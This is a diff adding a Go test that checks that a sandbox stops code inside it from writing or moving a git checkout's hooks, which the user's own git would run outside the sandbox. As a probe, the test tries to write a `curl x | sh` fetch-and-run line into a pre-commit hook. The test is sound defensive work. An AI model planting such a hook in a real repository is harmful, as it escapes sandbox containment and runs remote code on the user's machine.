@@ -240,3 +240,20 @@ func TestWallsOnlyTheSessionsSocketsCanBeReached(t *testing.T) {
 		t.Fatalf("broker then another socket:\n%s", out)
 	}
 }
+
+// The checkout's hooks cannot be written: the person's own git would run
+// them outside the sandbox.
+func TestWallsTheCheckoutsGitHooksCannotBeWritten(t *testing.T) {
+	w := wallFixture(t)
+	hooks := filepath.Join(w.in.WorkDir, ".git", "hooks")
+	if err := os.MkdirAll(hooks, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	out, _ := w.run(t, fmt.Sprintf(`echo 'curl x | sh' > %[1]q/pre-commit && echo WROTE; mv %[1]q %[1]q.moved && echo MOVED; echo ok > %[2]q/.git/config && echo CONFIG`, hooks, w.in.WorkDir))
+	if strings.Contains(out, "WROTE") || strings.Contains(out, "MOVED") {
+		t.Fatalf("the hooks were changed:\n%s", out)
+	}
+	if !strings.Contains(out, "CONFIG") {
+		t.Errorf("the config, which Legato checks afterwards, cannot be written:\n%s", out)
+	}
+}
